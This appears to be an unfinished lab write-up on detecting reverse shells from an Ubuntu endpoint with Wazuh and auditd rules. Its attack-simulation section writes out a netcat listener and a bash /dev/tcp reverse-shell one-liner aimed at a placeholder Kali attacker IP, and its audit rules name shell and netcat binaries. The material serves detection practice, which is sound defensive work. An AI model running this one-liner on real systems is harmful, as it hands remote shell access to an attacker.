# THIS IS STILL IN WORKS

# Reverse Shell Detection

## Objective

Detect and investigate reverse shell activity originating from a monitored Linux endpoint using Wazuh SIEM and supporting endpoint telemetry.

---

## Overview

A reverse shell attack was simulated from a monitored Ubuntu endpoint to a Kali Linux attacker machine. The objective of this use case was to validate the ability of the SOC environment to identify suspicious shell execution and outbound attacker-controlled connections.

The activity was analyzed through Wazuh alerts, Linux logs, process activity, and network connections.

---

## Configuration 
Most of the work is alredy done in [Malicious cmd](../use-cases/malicious-command-execution-auditd.md), Now all we need to do is create cutom rules to monitor and look out for reverse shell codes.<br>

1. Agent VM
    - open the custom rules file and add the following rules<br>
    ```
    -a always,exit -F arch=b64 -S execve -F auid>=1000 -k user_cmd_exec

    -w /bin/bash -p x -k shell_execution
    -w /bin/sh -p x -k shell_execution
    -w /usr/bin/nc -p x -k reverse_shell
    ```
    - restart service <br>
    `sudo auditctl -R /etc/audit/rules.d/custom.rules`
    
## Attack Simulation

1. Start Listener on Kali

```
nc -lvnp 4444
```

---

2. Execute Reverse Shell on Target

```
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
```

3. Wazuh dashboard
    - Login into wazuh dashboard 
    - under agent -> Security events, you will find all the above commands alerts mapped to rule_id, mitre attack TTPs and other details.

    - Refernce Image:
        - []()